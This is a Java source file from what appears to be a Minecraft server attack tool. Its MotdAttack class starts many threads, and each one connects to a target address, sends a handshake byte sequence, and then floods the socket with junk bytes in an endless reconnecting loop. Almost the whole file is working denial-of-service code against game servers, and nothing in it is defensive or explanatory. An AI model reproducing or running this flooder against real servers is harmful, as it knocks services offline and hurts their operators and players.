package co.akarin.endminecraftultra.ATTACK;

import java.io.IOException;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;

import co.akarin.endminecraftultra.utils.mainUtils;

public class MotdAttack extends IAttack {
    public List<Thread> threads=new ArrayList<Thread>();

    public MotdAttack(int time,int maxconnect,int joinsleep,boolean motdbefore,boolean tab,HashMap<String, String> modList) {
        super(time, maxconnect, joinsleep, motdbefore, tab, modList);
    }

    public void start(final String ip,final int port) {
        Runnable task=()->{
            while(true)
            {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(ip,port));
                    if(socket.isConnected()) {
                        mainUtils.log("Motd/"+Thread.currentThread().getName(),"连接成功");
                        OutputStream out = socket.getOutputStream();
                        out.write(new byte[] {0x07,0x00,0x05,0x01,0x30,0x63,(byte)0xDD,0x01});
                        out.flush();
                        while(socket.isConnected()) {
                            for(int i=0; i<10; i++) {
                                out.write(new byte[] {0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00,0x01,0x00});
                            }
                            out.flush();
                        }
                        try {
                            out.close();
                            socket.close();
                        } catch (IOException e) {}
                        mainUtils.log("Motd/"+Thread.currentThread().getName(),"已断开");
                        mainUtils.sleep(1000);
                    }
                } catch (Exception e) {
                    mainUtils.log("Motd/"+Thread.currentThread().getName(),e.getMessage());
                    e.printStackTrace();
                }
            }
        };

        if(this.attack_maxconnect<1) this.attack_maxconnect=10;

        for(int i=0; i<this.attack_maxconnect; i++) {
            Thread thread=new Thread(task);
            thread.setName(String.valueOf(i+1));
            thread.start();
            threads.add(thread);
        }
    }

    @SuppressWarnings("deprecation")
    public void stop() {
        threads.forEach(thread->{
            thread.stop();
        });
    }
}
